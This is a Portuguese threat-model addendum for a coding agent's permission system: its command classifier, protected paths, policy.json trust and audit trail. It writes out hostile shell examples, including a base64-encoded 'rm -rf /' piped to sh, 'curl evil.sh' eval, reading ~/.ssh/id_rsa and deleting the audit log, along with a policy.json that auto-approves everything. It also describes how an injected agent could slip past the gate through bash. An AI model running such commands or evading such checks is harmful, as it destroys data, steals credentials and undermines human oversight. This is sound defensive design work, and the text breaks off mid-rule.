# Gate 3 — Adendo da Fase 2: Segurança e permissões (passe STRIDE product-wide, escopado à Fase 2)

**Demanda:** reconstruir o Conductor Coding Agent sobre o runtime Pi
(earendil-works/pi) — **Fase 2, "Segurança e permissões"**.
**Branch:** `feature/fase2-seguranca-e-permissoes` (de `develop`).
**Papel responsável:** `security-engineer` (skill `model-threats`), executado como
subagente, **modo autônomo** (`/cdt-auto`, sem checkpoint humano por gate).

**Natureza deste documento:** é um **adendo** aos threat models da Fase 0
(`docs/conductor/gate3-threat-model.md`, T1–T10) e da Fase 1
(`docs/conductor/gate3-fase1-addendum.md`, T11–T16), que **estende, não
substitui**. Todo o DFD de 6 travessias (TB1–TB6), as ameaças T1–T16, os secure
defaults 1–13 e a **regra-mãe fail-closed** continuam válidos e não são
re-litigados. Este adendo paga a **dívida explicitamente registrada** no §7 da
Fase 0 e no §5 da Fase 1 ("passe STRIDE product-wide **ainda devido antes da
Fase 2**"), mas **escopado ao que a Fase 2 realmente entrega** — não às
superfícies de Fase 3+ (extensions/skills de terceiros, subagentes, MCP, modo
autônomo de produto, fallback completo de provedor), que continuam **fora de
escopo e devidas às suas próprias fases** (spec Gate 2 §3 Non-goals).

**Superfície modelada = a spec da Fase 2** (`docs/conductor/gate2-spec-fase2.md`):
24 FRs (grupos A–G), 12 BRs, 13 edge cases. Este documento é o Gate 3 que a
própria spec §9 (perguntas em aberto #1) declarou devido.

**Método:** Shostack — o que estamos construindo (o delta de superfície da
Fase 2, §1); o que pode dar errado (STRIDE-per-element sobre as 7 superfícies
novas/estendidas, §2); o que fazemos a respeito (mitigações → regras vinculantes
pro Gate 4, §4); fizemos um bom trabalho (critérios de saída, §7 + lacunas
honestas reportadas de volta ao Gate 2, §5).

**Fato dominante herdado (inalterado):** um **único processo de SO, sem sandbox**,
rodando com o privilégio do usuário; o único primitivo de enforcement é
`pi.on("tool_call")` (Fase 0 §1/§2). A Fase 2 é uma camada de **política** dentro
desse processo confiado — **não** isolamento de kernel (spec §3 Non-goal
"Sandbox de processo/SO"). Isso limita estruturalmente o que qualquer mitigação
abaixo pode prometer, e o adendo é honesto sobre isso onde importa (T23, T24).

---

## 1. Delta de superfície — as 7 superfícies novas/estendidas da Fase 2

A Fase 1 encerrou com 3 níveis de ferramenta governados (read/write/edit) +
bash-só-com-confirm + os stores de config. A Fase 2 acrescenta 7 superfícies,
uma por entregável do plano §8:

| # | Superfície | NOVO / estende | Relação com o DFD herdado |
|---|---|---|---|
| S1 | **Permission Engine** (motor de decisão de 5 níveis: Read/Write/Exec/Network/Security) | Estende `decideToolCall` (hoje 3 tools) | TB2 (o chokepoint) inalterado como *mecanismo*; a *lógica* cresce de 3 branches para uma resolução de nível fail-closed sobre toda ferramenta |
| S2 | **Command Classifier** (low/medium/high/critical para cada `bash`) | **NOVO** | Refina TB2 para o `bash`, que na Fase 0/1 só tinha o gate binário confirm — sem análise da string de comando |
| S3 | **Protected-Path Extension via `policy.json`** | Estende T13 (Fase 1) | Cria `.conductor/policy.json` de fato — um novo *data store de política* que é lido **e obedecido** na abertura da sessão. Refina TB5 e vira alvo de TB4 |
| S4 | **Network Permission + Egress Event** (nível `Network` operacional) | **NOVO** | Formaliza TB3 (egress): a chamada ao provedor já era consentida por config (Fase 0 T7); a Fase 2 governa **todo outro** destino de rede por default-deny + consentimento + evento |
| S5 | **Redaction Pipeline** (mascarar segredo em sinks que precisam continuar funcionando) | **NOVO** — distinto do Secret Scanner (que **bloqueia** escrita em `config.json`) | Refina TB5 (persistência) e TB1 (exibição) e TB3 (egress): o mesmo segredo pode vazar por qualquer sink de saída |
| S6 | **Audit Trail / Security Event Log** (persistência append-only de toda decisão) | **NOVO** — persiste o que `PermissionGateDecision`/`onDecision` hoje só emite em memória | Novo *data store sensível* — TB5 se repete para ele (spec §9 #1) |
| S7 | **Modo `--yes`** (bypass explícito da confirmação humana) | **NOVO** | Modifica TB1 (o canal de aprovação humano): remove o humano do loop para um subconjunto de decisões |

**Observação de fronteira (a que mais importa nesta fase):** o `policy.json` (S3)
não é só um *alvo de escrita* protegido (o que T13 já cobriu) — ele é também uma
**fonte de confiança de entrada**: um arquivo que chega **dentro de um repositório
clonado** e é lido-e-obedecido para configurar a própria gate. T13 tratou "o
agente não pode **escrever** sua política"; a Fase 2 abre a pergunta nova "quem
**autorou** a política que a gate obedece, e ela veio de uma fonte confiável?"
(T18/T19). É o análogo de segurança do `.envrc` do direnv ou do
`.vscode/settings.json`: trust-on-first-use de um arquivo controlado pelo repo.

---

## 2. Ameaças novas da Fase 2 (T17–T27)

Escala idêntica às fases anteriores: Probabilidade {Baixa, Média, Alta} × Impacto
{Baixo, Médio, Alto, Crítico}; Prioridade P1…P4. Cada mitigação é amarrada a um
primitivo real do Pi/Conductor e vira uma **regra vinculante** numerada no §4.

### Sumário priorizado

| ID | Ameaça | STRIDE | Prob | Impacto | Prio | Superfície |
|---|---|---|---|---|---|---|
| **T23** | `bash` (texto livre) **contorna a checagem de protected-path** — `config.json`/`policy.json`/`audit.jsonl`/`~/.ssh` alcançáveis por `bash`, que nunca passa por `evaluateToolPath` | T, E, R | **Alta** | **Crítico** | **P1** | S1/S2 |
| **T24** | `--yes` **alcança estruturalmente** um protected-path / comando `critical` via `bash` auto-aprovado (sem checagem de path) | E | **Alta** | **Crítico** | **P1** | S7 |
| **T17** | Command Classifier **enganado por ofuscação/encoding** — verbo destrutivo não aparece literalmente (`base64 -d \| sh`) → tier `low` | T, E | **Alta** | **Crítico** | **P1** | S2 |
| **T18** | `policy.json` **hostil vindo de repo clonado** (trust-on-first-use) concede auto-aprovação / consente rede | E, S | Média | Crítico | **P1** | S3 |
| **T21** | **Sink de redação esquecido** — session JSONL, `ctx.ui.notify`/reason de bloqueio, erro re-lançado não passam por redação | I | Alta | Alto | **P1** | S5 |
| **T25** | Agente **apaga/edita o próprio audit trail** (via `bash`, herdando T23) — log de auditoria inútil | T, R | Média | Alto | **P1** | S6 |
| **T19** | **Merge inseguro de políticas** (projeto ∪ usuário) — grants unidos em vez de trust-ordered/interseção | E | Média | Alto | **P2** | S3 |
| **T22** | Redação **tarde demais** — segredo já persistiu em claro no store antes de ser mascarado no render/export | I | Média | Alto | **P2** | S5 |
| **T20** | **Egress sem consentimento / sem evento durável** pré-gravado; canal do provedor continua exfil residual | I, R | Média | Alto | **P2** | S4 |
| **T26** | Audit trail é um **novo store sensível** (TB5 repete) — segredo/PII, permissões de arquivo, protegido+gitignored | I | Média | Médio | **P2** | S6 |
| **T27** | Crescimento p/ 5 níveis **reintroduz fail-open** na resolução de nível (tool sem nível → default permissivo) | E | Baixa | Crítico | **P2** | S1 |

---

### T23 — `bash` contorna a checagem de protected-path (P1 — o achado mais forte da fase)
**STRIDE:** Tampering + Elevation + Repudiation · **Elemento:** TB4/TB2 (`bash` → FS).
**Achado verificado no código, não hipotético.** `permission-gate.ts` chama
`evaluateToolPath` (a canonicalização real-path + protected-paths de
`workspace-policy.ts`) **apenas** nos branches `read`/`write`/`edit` (linhas
76–95). O branch `bash` (linhas 97–102) faz **só** `confirmOrDeny` — o comentário
do próprio código admite: *"Per-argument path containment is not applied to
bash's free-text `command` string"*. Consequência: um comando
`bash: rm -rf .conductor/policy.json`, `bash: echo '{}' > .conductor/config.json`,
`bash: cat ~/.ssh/id_rsa`, `bash: rm .conductor/audit.jsonl` **nunca é checado
contra a lista de protected-paths** — a única barreira é a aprovação humana
(`confirm`), e sob `--yes` (T24) nem isso. Isso torna as garantias de
protected-path **estruturalmente ilusórias para `bash`**: FR-9 (`policy.json`
protegido), FR-17 (audit trail protegido) e BR-4 (`policy.json` só muda fora de
banda) valem para `write`/`edit`, mas **`bash` passa por baixo de todas elas**.
T13 (Fase 1) protegeu `policy.json`/`config.json` de `write`/`edit` — e é real —
mas não fecha o `bash`, que é a porta larga. Prob **Alta** (é o caminho de menor
resistência para qualquer agente sob injeção — Fase 0 T5); Impacto **Crítico**
(desarma silenciosamente todo o resto da Fase 2).
**Mitigação (semântica de segurança — mecanismo é Gate 4):** como **não há
sandbox** (fato dominante), não existe uma camada que impeça `bash` de alcançar
qualquer path que o processo alcança. A resposta honesta tem duas partes, e a
primeira é **não mentir sobre a garantia**: (i) o produto **não pode afirmar** que
`config.json`/`policy.json`/`audit.jsonl` são *hard-protected* enquanto `bash`
estiver habilitado — a garantia hard-block vale só para `write`/`edit`; para
`bash` ela **degrada** para "classificador + aprovação", não bloqueio estrutural;
(ii) o **Command Classifier (S2) é o controle que fecha o gap**: todo `bash` cujo
alvo detectável de escrita/remoção (`>`, `>>`, `rm`, `mv`, `truncate`, `dd`,
`tee`, `install`, `cp` sobre um destino) resolva para um protected-path ou para
fora do workspace é classificado **no mínimo `high`** (exige aprovação humana
explícita) ou **`critical`** (negado) — e **nunca** é `--yes`-elegível (T24, R8).
*Grounding:* **Security Engineering Principles** §1.2/§1.9 (defense in depth —
"assume each layer can fail"; a checagem de path do `write`/`edit` é uma camada, o
classificador é a segunda para o `bash`); **Secure and Reliable Systems Design**
§3.3/§3.13 (least privilege / blast radius — "expose narrow purpose-built APIs
instead of ambient root"; `bash` é *ambient authority* por natureza, então o
controle tem que estar na classificação da instância, não na tool). Cross-ref:
T1/T2 (Fase 0, protected-paths), T13 (Fase 1). **Reportado como GAP-D ao Gate 2.**

### T24 — `--yes` alcança protected-path/`critical` via `bash` auto-aprovado (P1)
**STRIDE:** Elevation · **Elemento:** TB1 (canal de aprovação) + TB4.
O critério do usuário foi explícito: *"`--yes` sendo usado (por bug, não por
design) pra bypassar bloqueio de protected-path — isso TEM que ser
estruturalmente impossível, não só 'não deveria acontecer'"*. No design atual
**é possível**: `--yes` remove a etapa `confirm`, que é o **único** controle do
`bash` (T23). Um `conductor chat --yes` + `bash: rm -rf ~/.ssh` auto-aprova sem
nenhuma checagem de path. FR-20 diz "`--yes` nunca transforma DENY em ALLOW" —
mas o `bash` que escreve num protected-path **nunca foi um DENY** (não é
path-checado), então pela *letra* de FR-20 não há violação; pelo *espírito*
(alcançar um protected-path) há. A regra precisa ser estrutural, não textual.
Prob **Alta** (é o uso pretendido de `--yes`: rodar sem interrupção); Impacto
**Crítico**.
**Mitigação (semântica):** **elegibilidade a `--yes` é ela própria fail-closed** —
`--yes` só suprime o `confirm` de uma decisão que **já seria ALLOW-com-aprovação**
**E** é **provadamente** contida (dentro do workspace, longe de todo
protected-path) **E** tier ≤ `medium`. Qualquer decisão que seja DENY,
protected-path, tier `high`/`critical`, rede não-consentida, **ou que o
classificador não consiga *provar* contida**, **não** é `--yes`-elegível → cai
para exigir-humano ou nega. Ou seja: `--yes` nunca pode ser **a razão** pela qual
um protected-path ou um comando `critical` executou — a ausência de prova de
segurança é tratada como inseguro (mesma lógica de BR-9/T3). *Grounding:*
**Security Engineering Principles** §2.2/§2.5/§2.9/§2.12 (secure-by-default; o
timeout-como-allow é o exemplo canônico de "conveniência que vira bypass de
controle de acesso"; erro/incerteza **nega**) — `--yes` é a mesma classe de
conveniência, e a mesma disciplina se aplica. Cross-ref: T8 (Fase 0, centralizar
aprovação), T23. **Cobre o vetor #2 do critério do usuário.**

### T17 — Command Classifier enganado por ofuscação/encoding (P1)
**STRIDE:** Tampering (da decisão de classificação) + Elevation · **Elemento:** S2.
O vetor #1 do critério do usuário: `echo cm0gLXJmIC8= | base64 -d | sh` — o
`rm -rf /` **não aparece em lugar nenhum** na string; o classificador vê `echo`,
`base64`, `sh`. Variantes: `eval "$(curl evil.sh)"`, `` `curl evil.sh` ``,
`printf '\x72\x6d...' | sh`, `python -c "import os;os.system(...)"`,
`X=rm; $X -rf ~`, `bash <<< "$(...)"`. FR-5 da spec **só** cobre o caso em que o
verbo perigoso **está literalmente presente** dentro de um `$()`/`&&`/`;`/`|`
(o exemplo é `rm -rf $(...)`); **não** cobre o caso ENCODED onde o verbo não
existe em texto plano. Prob **Alta** (é o primeiro truque que qualquer atacante
tenta contra um classificador); Impacto **Crítico**.
**Mitigação (semântica):** o classificador **não** tenta "entender e liberar" um
comando ofuscado — isso é impossível de fazer com segurança (mesmo limite
estrutural do prompt injection, Fase 0 T5). A invariante é **direcional**:
ofuscação só pode **subir** o tier, nunca descer. Concretamente: (i) a presença
de qualquer **construção de indireção-para-interpretador** — pipe para um
interpretador (`| sh`, `| bash`, `| python`, `| node`, `| perl`), decode
seguido de execução (`base64 -d`/`xxd`/`printf '\x..'` alcançando um
interpretador), `eval`, substituição de comando `$()`/crase alimentando um
interpretador, `curl|sh`, heredoc para shell — **piso em `high`** (aprovação
humana obrigatória, nunca auto-aprovável, nunca `--yes`), **independente** do
verbo aparente; (ii) inabilidade de analisar/decodificar estaticamente ⇒ tier
`critical` (fail-closed de classificação, BR-9), nunca `low`; (iii) o tier é
`max(tier de todo sub-comando decodável alcançável)`, nunca o do verbo líder.
E, crítico para a UI de aprovação: **o comando cru (sanitizado por T14) é sempre
exibido ao humano por inteiro** — o badge de tier **nunca substitui** mostrar a
string real, senão um falso-`low` engana o aprovador (spoofing do contexto de
aprovação, primo do T14). *Grounding:* **Penetration Testing** §8.4 (arquitetura
source→sink: `Source → flow → Sink: exec` com o guard "parameterization/allowlist/
sandbox" que a ofuscação **quebra** — a string de comando é a *source*, o
interpretador é o *sink*) e §8.2/§8.11 (command injection dá execução no host);
princípio **allowlist-sobre-denylist** (um classificador que tenta *negar o que
é ruim* perde para encoding — só um piso conservador + allowlist explícita de
padrões conhecidos-bons é defensável). **Nota de cobertura honesta:** a biblioteca
**não tem capítulo dedicado a classificação de risco / ofuscação de comando de
shell** (consulta desta sessão: top 0.626, material de injection/supply-chain
genérico); ancorado por source→sink + allowlist-sobre-denylist + fail-closed,
sem forçar citação — mesma postura da Fase 0 com T5. **Reportado como GAP-A ao
Gate 2** (FR-5 precisa cobrir o caso encoded/indireção, não só verbo-literal).

### T18 — `policy.json` hostil de repo clonado (trust-on-first-use) (P1)
**STRIDE:** Elevation + Spoofing (de autoridade) · **Elemento:** S3.
Vetor #4 do critério do usuário. `policy.json` é **lido e obedecido** na abertura
da sessão. FR-3 permite que ele **rebaixe** um comando para auto-aprovado
(allowlist `low`); a Fase 2 também prevê que ele consinta destinos de rede. Um
**repositório clonado de fonte não-confiável** pode trazer um
`.conductor/policy.json` que auto-aprova comandos amplos (`{"allowlist":[{"pattern":".*","risk":"low"}]}`)
ou consente `evil.internal` — e o usuário que só rodou `git clone && conductor
chat` **silenciosamente** roda com a gate reconfigurada pelo atacante. É a imagem
espelhada de T13: T13 impediu o agente de **escrever** `policy.json`; T18 é o
arquivo chegando **pré-escrito** de uma fonte não-confiável. Prob **Média**
(exige um repo hostil, mas é o cenário de "clonar um projeto da internet");
Impacto **Crítico** (desarma a gate na abertura).
**Mitigação (semântica):** **separar a semântica de `policy.json` em RESTRIÇÕES
e GRANTS**, com confiança assimétrica:
- **Restrições** (adicionar protected-paths, **subir** o tier de um comando):
  aplicam **incondicionalmente e unidas** aos defaults — sempre mais seguro,
  qualquer fonte pode restringir mais (BR-5 já cobre para protected-paths).
- **Grants** (auto-aprovar por allowlist, consentir rede, **descer** um tier):
  exigem **trust-on-first-use** — na primeira vez que o `policy.json` de um
  projeto (identificado por hash do conteúdo) **concederia** algo, o usuário
  aprova **fora de banda** e o hash é fixado; um `policy.json` desconhecido ou
  **alterado** cai para **grants-ignorados** (só defaults), nunca
  grants-honrados-silenciosamente.
- **Tetos rígidos, independentes de confiança:** uma allowlist **nunca**
  auto-aprova `critical` (BR-8 já) **nem `high`** (novo); consentimento de rede
  sempre emite Egress Event e é globalmente revogável; `policy.json` **nunca**
  remove um protected-path default (BR-5).
*Grounding:* **Secure and Reliable Systems Design** §3.3/§3.12/§3.13 (least
privilege; "the reachable authority has never been enumerated" — um grant de um
arquivo do repo *é* autoridade alcançável que ninguém enumerou; "require
multi-party authorization for sensitive actions" — o trust-on-first-use é a
segunda parte); **Security Engineering Principles** §2.12 (destinos de egress /
allowlists dependem do *deployment*, não do produto — por isso o produto não
proíbe grants, mas exige **consentimento explícito** por deployment, que é o
trust-on-first-use). **Reportado como GAP-B ao Gate 2** (spec trata `policy.json`
como confiável; BR-5 fixa união só para restrições, é silente sobre grants).

### T21 — Sink de redação esquecido (P1)
**STRIDE:** Information disclosure · **Elemento:** S5 (todos os sinks de saída).
Vetor #3 do critério do usuário, e a lição literal do T14 da Fase 1
(`gate8-validation-fase1.md` §6.1: "cada sink se defende sozinho" — T14 fechou o
`confirm`, o transcript ficou aberto). BR-12 da spec captura o princípio, **mas a
enumeração de sinks está incompleta**. Verifiquei os sinks reais da Fase 2:
1. **stdout / transcrito da TUI** — FR-13 ✓
2. **arquivo de audit trail** — FR-12 ✓
3. **`session export` futuro** — FR-14 ✓ (quando existir)
4. **session JSONL** (`.conductor/sessions/*.jsonl`, Fase 1) — **AUSENTE da lista
   de redação.** É um store persistente que já captura args/resultados de tool em
   claro desde a Fase 1; um `.env` lido ou um token na saída de `bash` **pousa em
   disco em claro**. É gitignored (ADR 0002 §5.2) mas **não redigido** — o T6 da
   Fase 0 concretizado.
5. **`ctx.ui.notify` / reason de bloqueio** — **AUSENTE.** `permission-gate.ts`
   linha 160 faz `ctx.ui.notify(\`Blocked ${event.toolName}: ${decision.reason}\`)`
   e `decision.reason` embute input controlado pelo modelo (o path/comando que
   falhou), que pode conter segredo. Esse caminho é **sanitizado para terminal**
   (T14) mas **não redigido para segredo**.
6. **mensagens de erro re-lançadas** — **AUSENTE.** `fail-closed.ts` devolve
   `reason: "policy evaluation error — fail closed: <message>"`, e `<message>`
   pode conter a string ofensora (path/comando com segredo); esse `reason` flui
   para o audit trail, o notify, e qualquer log.
Prob **Alta** (transcripts/logs capturam saída de comando por rotina); Impacto
**Alto**.
**Mitigação (semântica):** o **conjunto de sinks é fechado e completo** — os seis
acima — e **cada um** aplica redação independentemente, idealmente por **um único
choke por caminho de saída** (o padrão "sole sink" que o `confirm.ts` já usa para
T14, generalizado). A redação roda no **limite mais externo** (imediatamente
antes dos bytes irem para disco/terminal/rede), para que um novo chamador
intermediário não consiga pular. *Grounding:* **OWASP ASVS 4.0.3** V6.4 Secret
Management ("Logging sensitive information is dangerous — the logs become
classified themselves ... no credentials (including session tokens), sensitive
or personally identifiable") e V7.1 Log Content (logs de alta qualidade
frequentemente contêm dado sensível e **devem ser protegidos**); **Secure Code
Review** §2.2/§2.5 (taint source→sink: o segredo é a *source*, cada sink de saída
é um *sink* — sanitizar/redigir **em cada sink**, exatamente o frame do XSS
auto-encoding em **Web Application Security** §2.7). **Reportado como GAP-C ao
Gate 2** (FR-12/13/14 + BR-12 precisam nomear os sinks 4/5/6 explicitamente).

### T25 — Agente apaga/edita o próprio audit trail (P1)
**STRIDE:** Tampering + Repudiation · **Elemento:** S6.
Vetor #5 do critério do usuário: *"se um agente comprometido pode apagar/editar
seu próprio log de auditoria, o log não serve pra nada"*. FR-17 declara o audit
trail um protected-path — o que protege contra `write`/`edit`, **mas é minado por
T23**: `bash: rm .conductor/audit.jsonl` ou `bash: > .conductor/audit.jsonl`
**não** passa por `evaluateToolPath`. Sem o log, uma ação negada/perigosa não
deixa rastro (repudiation). Prob **Média**; Impacto **Alto**.
**Mitigação (semântica):** (i) audit trail é protected-path para `write`/`edit`
(FR-17) **E** todo `bash` cujo alvo resolva para `.conductor/audit.jsonl` é
classificado `critical` → **negado** (aplicação de T23/R7 ao sink de auditoria);
(ii) aberto **append-only** (`O_APPEND`) — nem o próprio motor reescreve entradas
passadas; (iii) **fail-closed na escrita de auditoria** (FR-18): se a entrada não
puder ser gravada duravelmente, a ação que ela auditaria é **negada** — nenhuma
ação com efeito colateral executa sem deixar rastro; (iv) conteúdo **redigido**
antes da escrita (T21). **Integridade criptográfica (hash-chain/assinatura) é
explicitamente Fase 4** (spec §3 Non-goal, `ConductorSessionStore`) — então o
audit trail da Fase 2 é *append-only + protegido*, **não** à prova de adulteração
criptográfica; um atacante com acesso direto ao disco (fora do loop do agente)
ainda pode editá-lo. Isso é **risco residual aceito**, honesto, não uma garantia
falsa. *Grounding:* **OWASP ASVS** V7.1/V7.2 Log Content/Processing (logs de
auditoria devem ser claros, protegidos e analisáveis); **Secure and Reliable
Systems Design** §3.13 ("route privileged access through an audit trail" — o valor
do audit trail *pressupõe* que o auditado não o controla, o que justifica ele ser
protected-path). Cross-ref: T13, T9 (Fase 0).

### T19 — Merge inseguro de políticas (projeto ∪ usuário) (P2)
**STRIDE:** Elevation · **Elemento:** S3.
Segunda metade do vetor #4: *"cubra o caso de um MERGE de políticas — projeto +
usuário — que produza união insegura em vez de interseção segura"*. Hoje só existe
`policy.json` de projeto; mas a **semântica de merge precisa ser fixada agora**
para o Gate 4 construir certo, porque um `policy.json` de projeto é
**atacante-alcançável** (vem no repo) e deve ser **menos confiável** que uma
config global do usuário. Um merge ingênuo que **une** allowlists/consentimentos
de rede deixa a fonte de menor confiança (o arquivo do repo) **adicionar grants
que o usuário nunca sancionou**. Prob **Média** (quando a config global existir);
Impacto **Alto**.
**Mitigação (semântica):** o merge é **assimétrico por tipo e por confiança**:
- `restrições_efetivas = união(todas as fontes)` — qualquer fonte pode restringir
  mais (protected-paths, tiers elevados). Seguro por construção.
- `grants_efetivos = trust-ordered / interseção` — um grant só vale se a fonte de
  **maior** confiança (usuário-global) o permite; a fonte de menor confiança
  (arquivo do repo) **nunca amplia** além do que o usuário permite, e só concede
  dentro dos tetos de T18. **Nunca `grants = união(todas as fontes)`.**
Regra-resumo: **restrições unem; grants intersectam (ordenados por confiança)**.
*Grounding:* **Secure and Reliable Systems Design** §3.3/§3.12 (least privilege /
failure domains — a autoridade efetiva de um princípio é a *interseção* dos
limites, não a união; enumerar a autoridade alcançável antes de conceder);
**Security Engineering Principles** §1.2/§1.9 (least privilege — "grant minimum
privilege everywhere"). **Reportado como GAP-B ao Gate 2** (junto com T18).

### T22 — Redação tarde demais (mask-after-persist) (P2)
**STRIDE:** Information disclosure · **Elemento:** S5.
A pergunta em aberto #5 da spec ("redigir na escrita do JSONL, ou só no
render/export?"). Se a redação roda **só** no render/export mas o session
JSONL / audit trail já persistiu **em claro**, o segredo já está no disco — e um
render redigido não o remove de lá. Prob **Média**; Impacto **Alto**.
**Mitigação (semântica — é requisito de segurança, não escolha livre de Gate 4):**
a redação **deve** ocorrer **antes da primeira escrita durável** (disco) e
**antes de qualquer egress** — "redigir na *entrada* de todo sink persistente ou
de saída", não na saída dele. Exibição efêmera na TUI (scrollback) é de menor
risco mas ainda é redigida (FR-13). A spec deixou #5 "para o Gate 4"; o Gate 3
**restringe** essa escolha: o resultado observável (segredo nunca toca disco/rede
em claro) fixa a direção (redigir-antes-de-persistir); o Gate 4 escolhe só o
*mecanismo* (onde a função é chamada). *Grounding:* **OWASP ASVS** V6.4 (o
objetivo é o segredo **não** virar parte do material persistido/classificado —
mascarar depois de persistir não satisfaz isso). **Reportado como GAP-E ao Gate 2**
(pergunta #5 deve ser resolvida na direção segura, não deixada em aberto).

### T20 — Egress sem consentimento / sem evento durável pré-gravado (P2)
**STRIDE:** Information disclosure + Repudiation · **Elemento:** S4 (TB3).
O nível `Network` novo. Riscos: (a) um caminho de egress que **não** roteia pela
gate de rede (um tool que abre socket direto — mesma classe do T4b/T15, código
fora do chokepoint); (b) um destino consentido usado para exfiltrar **mais** do
que o pretendido (o consentimento é por-destino, mas o *payload* é ilimitado —
conteúdo de arquivo, segredo); (c) o Egress Event é best-effort e se perde num
crash a meio da chamada (repudiation). Prob **Média**; Impacto **Alto**.
**Mitigação (semântica):** (i) `Network` é **default-deny** para todo destino
exceto o **único endpoint de provedor configurado** (Fase 0 T7, já consentido por
config); qualquer outro host **nega sem consentimento** (FR-6); (ii) o Egress
Event é escrito no audit trail (**redigido**, T21) **antes** de a chamada
prosseguir — não "melhor esforço depois" (BR-6 estendido à rede): sem evento
durável, sem egress; (iii) **honestidade sobre o residual:** o canal do
**provedor de modelo** já consentido é, ele próprio, o maior canal de exfiltração
(uma injeção pode mandar conteúdo de arquivo *para o provedor* dentro de um
prompt legítimo) — o nível `Network` **contém destinos novos, não fecha o canal
do provedor** (Fase 0 T5/T7 residual, inalterado). A Fase 2 **não pode
over-claim** que "toda exfiltração é gated". *Grounding:* **Security Engineering
Principles** §2.12 (destinos de egress dependem do deployment → default-deny +
consentimento explícito por deployment, não proibição); **Penetration Testing**
§16.2/§16.11 (default-deny de rede; "bind to localhost; default-deny firewall");
**Privacy Engineering** §1.5 (private-by-default: "Identifiable tracking: OFF by
default, ON only with explicit opt-in consent + purpose" — o mesmo padrão
consentimento+propósito para egress); **Secure and Reliable Systems Design** §3.3
(zero-trust: "network location grants no authority"). **GAP-F (menor) ao Gate 2:**
FR-7 não fixa a ordem (evento antes vs. depois da chamada) — fixar pré-gravação.

### T26 — Audit trail é um novo store sensível (TB5 repete) (P2)
**STRIDE:** Information disclosure · **Elemento:** S6.
A spec §9 #1 já sinalizou: "o audit trail em si é um novo data store sensível —
TB5 se repete para ele". Ele captura inputs/reasons de tool → pode conter
segredo (por isso T21/redação) e PII. Prob **Média**; Impacto **Médio**.
**Mitigação (semântica):** redação antes da escrita (T21); **local-first** — não
sai da máquina sem ação explícita do usuário (NFR-5); permissão de arquivo
restritiva (0600); **gitignored** (como `sessions/`, ADR 0002 §5.2);
**protected-path** contra `write`/`edit`/`bash` (T25). Nota menor: um `read` do
audit trail é permitido (está no workspace) — um agente sob injeção poderia lê-lo
para aprender o que foi negado e se adaptar; risco **Baixo** (não revela nada que
o agente não tenha feito), registrado, não mitigado ativamente nesta fase.
*Grounding:* **OWASP ASVS** V6.4/V7.1 (o log é material classificado — proteger,
minimizar, reter com cuidado); **plano** §3.5 (memória local-first). Cross-ref:
T6 (Fase 0), T11 (Fase 1).

### T27 — Crescimento p/ 5 níveis reintroduz fail-open na resolução de nível (P2)
**STRIDE:** Elevation · **Elemento:** S1.
Hoje `decideToolCall` trata 3 tools e cai num **default-deny terminal** (linha
122: `no policy declared for tool "..." — fail closed`) — que é a garantia de
FR-22. Ao refatorar para 5 níveis (Read/Write/Exec/Network/Security), o risco é
(a) remover/afrouxar esse fall-through terminal, ou (b) mapear uma tool para um
nível **baixo demais** por omissão. Prob **Baixa** (é código first-party sob nosso
controle); Impacto **Crítico** (um fail-open aqui derruba a gate inteira, como
T3).
**Mitigação (semântica):** a **resolução de nível é ela própria fail-closed** —
uma tool sem Permission Level explícito e inequívoco mapeia para o nível de
**maior** escrutínio (Security) e **nega sem política** (BR-2 estendido dos 3
níveis para os 5); o `return {block:true, no policy declared}` terminal **deve
sobreviver ao refactor como o último branch** (FR-22 é regressão obrigatória,
NFR-4). É o análogo, no eixo *nível-da-tool*, do que BR-9 é no eixo
*tier-do-comando*: a incerteza mapeia para o mais restrito, nunca para o mais
permissivo. *Grounding:* **Security Engineering Principles** §2.5/§2.9/§2.12
(fail-closed: erro/incerteza nega; o default seguro é opt-out, não opt-in);
**Secure and Reliable Systems Design** §3.13 (least privilege por default).
Cross-ref: T3 (Fase 0, o fail-open canônico).

---

## 3. Cobertura explícita dos 5 vetores do critério de saída

Mapa direto dos vetores que o usuário nomeou como "a razão real deste gate
existir" para as ameaças/regras que os fecham:

| Vetor do critério | Ameaça(s) | Regra vinculante | Status |
|---|---|---|---|
| **1.** Comando composto/ofuscado engana o classifier (`base64 -d \| sh`) | **T17** | R1, R2 | Fechado por semântica (piso-em-high na indireção-p/-interpretador; ofuscação só sobe tier) + **GAP-A** ao Gate 2 (FR-5 é insuficiente) |
| **2.** `--yes` bypassa protected-path (tem que ser **estruturalmente** impossível) | **T24** (+ **T23** mecanismo) | R7, R8 | Fechado: elegibilidade a `--yes` é fail-closed (prova-contida-ou-nega); `--yes` nunca é *a razão* de um protected-path/`critical` executar |
| **3.** Redaction pipeline com sink esquecido (lição T14) | **T21** (+ **T22**) | R6 | Fechado: conjunto de sinks fechado e completo (transcrito, notify/reason, audit, **session JSONL**, export, **erro re-lançado**); redação no limite externo, antes de persistir. **GAP-C/GAP-E** ao Gate 2 |
| **4.** `policy.json` como vetor de escalação + **merge** projeto+usuário (união insegura vs interseção segura) | **T18** + **T19** | R3, R4 | Fechado: split restrições/grants; grants exigem trust-on-first-use + tetos; **restrições unem, grants intersectam**. **GAP-B** ao Gate 2 |
| **5.** Audit trail adulterável pelo próprio agente | **T25** (+ **T26**) | R7, R9 | Fechado para o loop do agente (protected-path + bash-critical + append-only + fail-closed-write + redigido); **cripto-integridade é Fase 4** — residual honesto declarado |

---

## 4. Regras vinculantes para o Gate 4 (arquitetura DEVE respeitar)

Estas são **semânticas de segurança** (o que deve ser bloqueado / fail-closed /
auditado), não arquitetura de classes. O Gate 4 escolhe o mecanismo; **não pode
violar estas**:

- **R1 (classificação fail-closed + piso na indireção).** Inabilidade de provar
  um `bash` como seguro ⇒ tier ≥ `high`; toda construção de
  indireção-para-interpretador (`|sh`/`|bash`/`|python`, `base64 -d`/decode→exec,
  `eval`, `$()`/crase→interpretador, `curl|sh`, heredoc→shell) **pisa em `high`**
  independente do verbo aparente; `tier = max(sub-comandos alcançáveis)`;
  encoding/ofuscação **só sobe**, nunca desce. (T17)
- **R2 (exibição conservadora).** O comando cru (sanitizado por T14/`terminal-
  sanitize.ts`) é **sempre** exibido por inteiro ao aprovador; o badge de tier
  nunca substitui mostrar a string real. (T17)
- **R3 (`policy.json` split-trust).** Restrições (adicionar protected-path, subir
  tier) aplicam incondicionalmente e unidas; grants (auto-aprovar, consentir
  rede, descer tier) exigem **trust-on-first-use** por hash do arquivo + **tetos**
  (nunca auto-aprova `high`/`critical`; nunca remove protected-path default; rede
  sempre com Egress Event). (T18)
- **R4 (merge assimétrico).** `restrições_efetivas = união(fontes)`;
